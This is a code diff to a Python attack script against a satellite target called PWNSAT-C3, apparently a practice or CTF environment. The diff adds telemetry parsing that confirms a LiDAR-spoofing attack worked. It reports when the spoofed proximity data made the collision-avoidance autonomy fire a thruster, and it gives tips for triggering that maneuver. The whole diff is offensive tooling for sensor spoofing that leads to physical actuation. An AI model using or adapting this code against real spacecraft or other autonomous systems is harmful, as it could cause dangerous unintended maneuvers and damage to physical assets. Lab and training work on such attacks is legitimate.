@@ -30,6 +30,8 @@ from tau_lidar_payload import (  # noqa: E402
 
 SPP_APID_TC_SET_LIDAR_FRAME = 0x15
 SPP_APID_TM_LIDAR = 0x14
+SPP_APID_TM_AUTONOMY = 0x16
+AUTONOMY_ACTION_THRUSTER = 0x01
 
 
 def _mm(value):
@@ -77,29 +79,45 @@ def main() -> None:
             listen_seconds=args.listen,
         )
 
-        confirmed = False
+        lidar_confirmed = False
+        autonomy_fired = False
         for raw in packets:
             try:
                 pkt = decode_packet(raw)
-            except ValueError:
+                body = fsat.decode_reply_payload(raw)
+            except Exception:  # defensive: skip replies that don't parse as SPP
                 continue
-            if pkt.apid != SPP_APID_TM_LIDAR:
-                continue
-            body = fsat.decode_reply_payload(raw)
+
             # LIDAR TM layout: [0] scid [1] present [2] frameType
             #                  [3..4] min [5..6] max [7..8] mean [9..10] center ...
-            if len(body) >= 11:
+            if pkt.apid == SPP_APID_TM_LIDAR and len(body) >= 11:
                 mn = struct.unpack_from("<H", body, 3)[0]
                 me = struct.unpack_from("<H", body, 7)[0]
                 ce = struct.unpack_from("<H", body, 9)[0]
                 print("[+] CONFIRMED via LIDAR TM (0x14): satellite now reports "
                       "min=%s mean=%s center=%s" % (_mm(mn), _mm(me), _mm(ce)))
-                confirmed = True
-            break
+                lidar_confirmed = True
 
-    if not confirmed:
+            # AUTONOMY TM layout: [1] armed [2] hazard [3..4] min [5..6] center
+            #                     [7..8] imuMilliG [9] action [10] thrusterCmd ...
+            elif pkt.apid == SPP_APID_TM_AUTONOMY and len(body) >= 11:
+                imu = struct.unpack_from("<H", body, 7)[0]
+                action = body[9]
+                thruster_cmd = body[10]
+                if action == AUTONOMY_ACTION_THRUSTER:
+                    print("[!] POISONED: collision-avoidance autonomy fired the "
+                          "thruster (power=%d) off the spoofed proximity -- the IMU "
+                          "(%dmg, no real motion) was never cross-checked."
+                          % (thruster_cmd, imu))
+                    autonomy_fired = True
+
+    if not lidar_confirmed:
         print("[!] No LIDAR TM (0x14) captured in the listen window -- widen "
               "--listen, or read the spoofed ranges from PWNSAT-C3's LiDAR panel.")
+    if not autonomy_fired:
+        print("[i] No autonomy maneuver reported -- try --preset collision and "
+              "make sure the satellite is in an operational mission mode "
+              "(nominal/payload/science), not safe.")
 
 
 if __name__ == "__main__":
